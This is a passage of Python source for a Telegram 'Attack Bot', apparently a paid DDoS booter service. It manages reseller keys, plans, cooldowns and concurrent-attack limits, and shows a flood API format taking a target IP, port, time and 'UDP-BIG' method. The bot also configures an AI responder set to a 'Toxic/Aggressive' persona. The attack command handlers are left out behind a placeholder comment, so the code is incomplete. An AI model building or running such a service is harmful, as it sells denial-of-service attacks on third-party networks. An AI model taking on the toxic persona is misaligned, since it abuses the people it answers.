                f"• /owner - Owner Panel\n"
                f"• /state - Bot Statistics\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Unlimited access to all features!</b>"
            )
        elif is_admin(user_id):
            welcome_msg = (
                f"👮 <b>Welcome Back, Admin!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👮 ADMIN ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Quick Stats:</b>\n"
                f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', 13)}\n"
                f"• Approved Groups: {groups_col.count_documents({})}\n"
                f"• Pending Feedback: {get_pending_feedback_count()}\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /owner - Admin Panel\n"
                f"• /state - Bot Statistics\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Unlimited access to admin features!</b>"
            )
        elif is_reseller(user_id):
            reseller = resellers_col.find_one({"_id": str(user_id)})
            credits = reseller.get("credits", 0) if reseller else 0
            welcome_msg = (
                f"💰 <b>Welcome Back, Reseller!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   💰 RESELLER ACCESS  ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Your Stats:</b>\n"
                f"• Credits: {credits}\n"
                f"• Active Keys: {keys_col.count_documents({'created_by': user_id, 'redeemed_by': None, 'expires': {'$gt': datetime.now().isoformat()}})}\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /reseller_panel - Your Panel\n"
                f"• /gen - Generate Keys\n"
                f"• /mycredits - Check Credits\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Unlimited attacks and key generation!</b>"
            )
        elif has_valid_plan(user_id, send_expiry_msg=False):
            plan = plans_col.find_one({"_id": str(user_id)})
            expires = datetime.fromisoformat(plan["expires"])
            remaining = expires - datetime.now()
            
            welcome_msg = (
                f"✅ <b>Welcome Back, Authorized User!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   ✅ ACTIVE PLAN      ║\n"
                f"╚════════════════════════╝\n\n"
                f"📅 <b>Plan Expires:</b> {format_expiry(expires)}\n"
                f"⏰ <b>Time Remaining:</b> {remaining.days}d {remaining.seconds//3600}h\n"
                f"🎯 <b>Attacks:</b> Unlimited\n"
                f"⏱️ <b>Max Duration:</b> {plan['max_duration']}s\n"
                f"⏳ <b>Cooldown:</b> {plan['cooldown']}s\n"
                f"🔢 <b>Max Concurrent:</b> 13\n\n"
                f"💡 <b>Quick Commands:</b>\n"
                f"• /attack - Launch Attack\n"
                f"• /status - Check Status\n"
                f"• /check_my_access - View Plan\n"
                f"• /help - All Commands\n\n"
                f"📸 <b>Feedback Required:</b>\n"
                f"After each attack, send a screenshot/image to continue!"
            )
        elif is_group(message) and is_approved_group(chat_id):
            limits = get_group_limits(chat_id)
            welcome_msg = (
                f"👥 <b>Welcome to {message.chat.title or 'Group'}!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   👥 GROUP ACCESS     ║\n"
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Group Limits:</b>\n"
                f"• Max Concurrent: {limits[0]}\n"
                f"• Max Time: {limits[1]}s\n"
                f"• Cooldown: {limits[2]}s\n\n"
                f"💡 <b>Available Commands:</b>\n"
                f"• /attack - Launch Attack\n"
                f"• /status - Check Status\n"
                f"• /help - All Commands\n\n"
                f"⚡ <b>Use the bot directly in this group!</b>"
            )
        else:
            welcome_msg = (
                f"👋 <b>Welcome to Attack Bot!</b>\n"
                f"╔════════════════════════╗\n"
                f"║   🔐 AUTH REQUIRED    ║\n"
                f"╚════════════════════════╝\n\n"
                f"📋 <b>How to Get Access:</b>\n"
                f"1️⃣ Purchase a key from our resellers\n"
                f"2️⃣ Use /redeem YOUR-KEY\n"
                f"3️⃣ Or join an authorized group\n\n"
                f"💡 <b>Commands:</b>\n"
                f"• /start - Start bot\n"
                f"• /help - Help menu\n"
                f"• /redeem - Redeem key\n"
                f"• /getid - Get your ID\n\n"
                f"⚡ <b>All authorized users get unlimited attacks!</b>"
            )
        
        bot.reply_to(message, welcome_msg)
        
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        log_error(e, user_id=message.from_user.id, command="start")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= REST OF THE COMMANDS =================
# All other command handlers remain the same as in your original 13con.py
# [All other command handlers would go here - /help, /attack, /status, etc.]

# ... (keeping all other command handlers from original file)

# ================= AUTO RESET FUNCTION =================
def auto_reset_bot():
    while True:
        try:
            time.sleep(AUTO_RESET_INTERVAL)
            
            if not get_setting("auto_reset_enabled", True):
                continue
            
            logger.info("Running auto-reset...")
            
            with _attack_lock:
                now = datetime.now()
                expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
                for k in expired:
                    del active_attacks[k]
            
            expired_plans = plans_col.delete_many({"expires": {"$lt": datetime.now().isoformat()}})
            
            expired_keys = keys_col.delete_many({
                "redeemed_by": None, 
                "expires": {"$lt": datetime.now().isoformat()}
            })
            
            seven_days_ago = (datetime.now() - timedelta(days=7)).isoformat()
            attack_logs_col.delete_many({"timestamp": {"$lt": seven_days_ago}})
            
            thirty_days_ago = (datetime.now() - timedelta(days=30)).isoformat()
            feedback_submissions_col.delete_many({
                "submitted_at": {"$lt": thirty_days_ago},
                "reviewed": True
            })
            
            update_setting("last_reset_time", datetime.now().isoformat())
            
            logger.info(f"Auto-reset completed. Removed {expired_plans.deleted_count} expired plans, {expired_keys.deleted_count} expired keys")
            
            try:
                reset_msg = (
                    f"🔄 <b>Auto Reset Completed</b>\n\n"
                    f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"🗑 Expired Plans: {expired_plans.deleted_count}\n"
                    f"🔑 Expired Keys: {expired_keys.deleted_count}\n"
                    f"⚡ Active Attacks: {get_active_attack_count()}\n"
                    f"📸 Pending Feedback: {get_pending_feedback_count()}"
                )
                bot.send_message(BOT_OWNER, reset_msg)
                if BOT_OWNER_2 != BOT_OWNER:
                    bot.send_message(BOT_OWNER_2, reset_msg)
            except:
                pass
            
        except Exception as e:
            logger.error(f"Error in auto reset: {e}")
            log_error(e, extra_info={"function": "auto_reset"})
            time.sleep(60)

reset_thread = threading.Thread(target=auto_reset_bot, daemon=True)
reset_thread.start()

# ================= BACKGROUND TASKS =================
def background_cleanup():
    while True:
        try:
            time.sleep(60)
            
            with _attack_lock:
                now = datetime.now()
                expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
                for k in expired:
                    del active_attacks[k]
            
            with _attack_lock:
                now = datetime.now()
                expired_cd = [k for k, v in user_cooldowns.items() if v <= now]
                for k in expired_cd:
                    del user_cooldowns[k]
            
            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
            pending_feedback_col.delete_many({
                "pending_since": {"$lt": week_ago}
            })
                    
        except Exception as e:
            logger.error(f"Background cleanup error: {e}")
            time.sleep(10)

cleanup_thread = threading.Thread(target=background_cleanup, daemon=True)
cleanup_thread.start()

# ================= ENHANCED ERROR HANDLER FOR BOT =================
def handle_bot_errors():
    while True:
        try:
            logger.info("Starting bot polling...")
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except requests.exceptions.ReadTimeout:
            logger.warning("Read timeout occurred. Restarting polling...")
            time.sleep(5)
        except requests.exceptions.ConnectionError:
            logger.warning("Connection error. Retrying in 10 seconds...")
            time.sleep(10)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            log_error(e)
            time.sleep(5)

# ================= SIGNAL HANDLERS =================
def signal_handler(sig, frame):
    logger.info("Shutdown signal received. Cleaning up...")
    update_setting("bot_stopped_time", datetime.now().isoformat())
    logger.info("Bot stopped gracefully")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ================= START BOT =================
if __name__ == "__main__":
    update_setting("bot_start_time", datetime.now().isoformat())
    
    logger.info("=" * 50)
    logger.info("Bot Starting...")
    logger.info(f"Bot Owner 1: {BOT_OWNER}")
    logger.info(f"Bot Owner 2: {BOT_OWNER_2}")
    logger.info(f"API URL: {get_setting('api_url', DEFAULT_API_URL)}")
    logger.info(f"API Key: {get_setting('api_key', DEFAULT_API_KEY)}")
    logger.info(f"Max Concurrent: {get_setting('max_concurrent_attacks', 13)}")
    logger.info(f"Max Attack Time: {get_setting('max_attack_time')}s")
    logger.info(f"Auto Reset: {'Enabled' if get_setting('auto_reset_enabled') else 'Disabled'}")
    logger.info(f"Auto Reset Interval: {AUTO_RESET_INTERVAL}s")
    logger.info(f"Feedback System: {'Enabled' if get_setting('feedback_system') else 'Disabled'}")
    logger.info("Channel Verification: DISABLED")
    logger.info(f"AI Enabled: {AI_ENABLED}")
    logger.info(f"AI Model: {AI_MODEL}")
    logger.info("AI Behaviour: ROST - Toxic/Aggressive")
    logger.info("=" * 50)
    
    update_channel_ids()
    
    try:
        startup_msg = (
            f"✅ <b>Bot Started Successfully!</b>\n\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"⚙️ Config:\n"
            f"├ Max Concurrent: {get_setting('max_concurrent_attacks', 13)}\n"
            f"├ Max Time: {get_setting('max_attack_time')}s\n"
            f"├ Cooldown: {get_setting('cooldown')}s\n"
            f"├ Auto Reset: {AUTO_RESET_INTERVAL}s\n"
            f"├ Feedback: {'✅ ON' if get_setting('feedback_system') else '❌ OFF'}\n"
            f"├ Required Channels: 0 (DISABLED)\n"
            f"├ API Format: ?key=KEY&target=IP&port=PORT&time=TIME&method=UDP-BIG\n"
            f"├ API: {get_setting('api_url', 'Default')[:50]}...\n"
            f"├ AI: {'✅ ON' if AI_ENABLED else '❌ OFF'}\n"
            f"├ AI Model: {AI_MODEL}\n"
            f"└ AI Behaviour: ROST (Toxic/Aggressive)\n\n"
            f"🔄 Bot is ready for operations!\n"
            f"📊 Max concurrent attacks: 13\n"
            f"⏱️ Max attack time: 400s\n"
            f"🤖 All messages will get AI reply with ROST behaviour"
        )
        bot.send_message(BOT_OWNER, startup_msg)
        if BOT_OWNER_2 != BOT_OWNER:
            bot.send_message(BOT_OWNER_2, startup_msg)
    except Exception as e:
        logger.error(f"Failed to send startup notification: {e}")
    
    handle_bot_errors()
